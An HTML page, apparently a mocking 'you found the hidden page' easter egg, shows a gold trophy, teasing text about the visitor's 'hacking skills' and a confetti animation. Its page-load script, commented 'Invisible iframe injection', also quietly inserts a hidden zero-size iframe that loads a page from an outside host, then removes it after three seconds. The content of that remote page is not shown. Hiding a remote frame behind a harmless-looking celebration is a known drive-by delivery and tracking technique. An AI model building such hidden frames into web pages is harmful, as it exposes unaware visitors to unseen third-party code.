<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>You're So Clever</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --background-color: #121212;
      --text-color: #e0e0e0;
      --primary-color: #bb86fc;
      --secondary-color: #03dac6;
      --trophy-shadow: #c9a32c;
    }

    body {
      background-color: var(--background-color);
      color: var(--text-color);
      font-family: 'Inter', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      text-align: center;
      overflow: hidden;
    }

    .container {
      max-width: 600px;
      padding: 2rem;
      animation: fadeIn 1.5s ease-in-out;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    h1 {
      font-size: 2.5rem;
      color: var(--primary-color);
      margin-bottom: 1rem;
      font-weight: 700;
    }

    p {
      font-size: 1.1rem;
      line-height: 1.6;
      margin-bottom: 1rem;
    }

    .trophy {
      width: 150px;
      height: 150px;
      margin-bottom: 2rem;
      animation: float 4s ease-in-out infinite;
      filter: drop-shadow(0 0 15px var(--trophy-shadow));
    }

    @keyframes float {
      0% {
        transform: translateY(0px);
      }
      50% {
        transform: translateY(-15px);
      }
      100% {
        transform: translateY(0px);
      }
    }

    iframe.hidden-frame {
      display: none;
      visibility: hidden;
      width: 0;
      height: 0;
      border: 0;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="trophy.png" alt="A shiny gold trophy" class="trophy">
    <h1>Wow, a Real Digital Detective!</h1>
    <p>Look at you, cleverly navigating directly to a page you weren't supposed to find. You must feel so proud of yourself for bypassing... well, nothing, actually.</p>
    <p>As a reward for your incredible hacking skills, here's a little celebration just for you.</p>
  </div>

  <script type="importmap">
  {
    "imports": {
      "canvas-confetti": "https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.module.mjs"
    }
  }
  </script>

  <script type="module">
    import confetti from 'canvas-confetti';

    function party() {
      const duration = 5 * 1000;
      const animationEnd = Date.now() + duration;
      const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };

      function randomInRange(min, max) {
        return Math.random() * (max - min) + min;
      }

      const interval = setInterval(function () {
        const timeLeft = animationEnd - Date.now();

        if (timeLeft <= 0) {
          return clearInterval(interval);
        }

        const particleCount = 50 * (timeLeft / duration);

        confetti(Object.assign({}, defaults, {
          particleCount,
          origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 }
        }));

        confetti(Object.assign({}, defaults, {
          particleCount,
          origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 }
        }));
      }, 250);
    }

    document.addEventListener('DOMContentLoaded', () => {
      // Invisible iframe injection
      const iframe = document.createElement('iframe');
      iframe.src = "https://prototbh.xyz/lol.html";
      iframe.className = "hidden-frame";
      document.body.appendChild(iframe);

      // Remove it after 3 seconds
      setTimeout(() => {
        iframe.remove();
      }, 3000);

      // Start the party after 1s
      setTimeout(party, 1000);
    });
  </script>
</body>
</html>
